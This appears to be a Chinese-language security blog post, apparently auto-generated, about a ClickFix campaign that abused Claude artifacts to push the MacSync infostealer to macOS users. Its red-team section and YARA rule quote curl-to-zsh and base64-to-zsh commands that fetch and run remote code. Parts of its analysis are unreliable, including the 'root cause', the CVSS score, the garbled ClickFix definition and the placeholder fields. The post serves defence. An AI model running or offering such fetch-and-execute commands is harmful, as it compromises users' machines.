---
layout: post
title:  "Claude LLM artifacts abused to push Mac infostealers in ClickFix attack"
date:   2026-02-14 01:23:54 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Claude 生成的惡意指令碼：ClickFix 攻擊對 macOS 用戶的威脅

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: LLM (Large Language Model), ClickFix 攻擊, macOS, Shell Command Injection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Claude 生成的指令碼沒有經過充分的驗證和過濾，導致攻擊者可以注入惡意指令碼。
* **攻擊流程圖解**:
  1. 攻擊者生成惡意指令碼並上傳到 Claude 平台。
  2. 用戶搜索特定關鍵詞，Google Ads 顯示惡意指令碼的連結。
  3. 用戶點擊連結，導致惡意指令碼被執行。
  4. 惡意指令碼下載和安裝 MacSync infostealer。
* **受影響元件**: macOS, Claude 平台

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個 Claude 平台的帳戶和上傳惡意指令碼的能力。
* **Payload 建構邏輯**:

    ```
    
    bash
      # 範例指令
      echo "..." | base64 -D | zsh
      true && curl -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh
    
    ```
  * 攻擊者可以使用 Claude 生成的指令碼來下載和安裝惡意軟件。
* **繞過技術**: 攻擊者可以使用 Claude 生成的指令碼來繞過 macOS 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| ... | ... | raxelpak[.]com | /tmp/osalogging.zip |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Claude_Malicious_Code {
        meta:
          description = "Detects Claude generated malicious code"
          author = "Your Name"
        strings:
          $a = "echo \"...\" | base64 -D | zsh"
          $b = "true && curl -SsLfk --compressed \"https://raxelpak[.]com/curl/[hash]\" | zsh"
        condition:
          any of them
      }
    
    ```
  * 可以使用 YARA Rule 來偵測 Claude 生成的惡意指令碼。
* **緩解措施**: 用戶應該避免執行未知的指令碼，並且應該保持 macOS 和軟件的更新。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **LLM (Large Language Model)**: 一種人工智慧模型，能夠生成類似人類的語言和指令碼。
* **ClickFix 攻擊**: 一種攻擊方式，攻擊者使用惡意指令碼來修復用戶的系統。
* **Shell Command Injection**: 一種攻擊方式，攻擊者注入惡意指令碼到用戶的 Shell 中。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/claude-llm-artifacts-abused-to-push-mac-infostealers-in-clickfix-attack/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1059/)


